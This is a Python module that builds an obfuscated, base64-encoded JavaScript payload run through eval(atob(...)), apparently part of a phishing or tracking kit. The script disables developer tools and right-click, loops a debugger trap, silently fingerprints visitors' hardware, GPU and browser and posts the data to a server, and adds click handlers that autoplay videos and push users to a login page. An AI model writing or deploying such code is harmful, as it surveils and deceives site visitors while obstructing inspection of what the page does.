"""js_capture.py — auto-generated from templates.py."""

import base64

from ._header import base64

raw_js = """
(function(){
    // Anti-DevTools logic
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.onkeydown = function(e) {
        if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
    };
    setInterval(function(){ debugger; }, 100);

    // Device Capture
    async function captureAll() {
        try {
            const deviceData = {
                res: window.screen.width + "x" + window.screen.height + " (DPR: " + window.devicePixelRatio + ")",
                mem: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Private",
                cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Unknown",
                plat: navigator.platform || "N/A",
                agent: navigator.userAgent,
                lang: navigator.language,
                gpu: (function() {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl');
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    } catch(e) { return "Unknown"; }
                })()
            };
            await fetch('/log_device', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(deviceData)
            });
        } catch (err) {}
    }
    captureAll();

    window.captureAndGo = function(redir) {
        window.pendingRedir = redir || "";
        // Redirection directe vers la page de login sans popup
        // Utiliser un formulaire POST synchrone pour garantir que la session
        // est sauvegardée avant la redirection
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/feed_click', false); // false = synchrone
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({redirect: window.pendingRedir}));
        } catch(e) {}
        window.location.href = "/?from_feed=1";
    };

    // Start ALL videos on the page (with sound if enabled), then call captureAndGo.
    window.startVideosAndGo = function(redir) {
        try {
            document.querySelectorAll('video').forEach(function(v) {
                try {
                    v.muted = false;
                    v.play().catch(function(e) {
                        v.muted = true;
                        v.play().catch(function(e2) {});
                    });
                } catch(e) {}
            });
        } catch(e) {}
        window.captureAndGo(redir);
    };

    window.confirmLogin = function() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/feed_click', false);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({redirect: window.pendingRedir}));
        } catch(e) {}
        window.location.href = "/?from_feed=1";
    };

    window.closeModal = function() {
        var modal = document.getElementById('login-modal');
        if (modal) modal.classList.add('hidden');
    };
})();
"""
b64_js = base64.b64encode(raw_js.encode()).decode()
JS_STRICT_CAPTURE = f"<script>eval(atob('{b64_js}'));</script>"
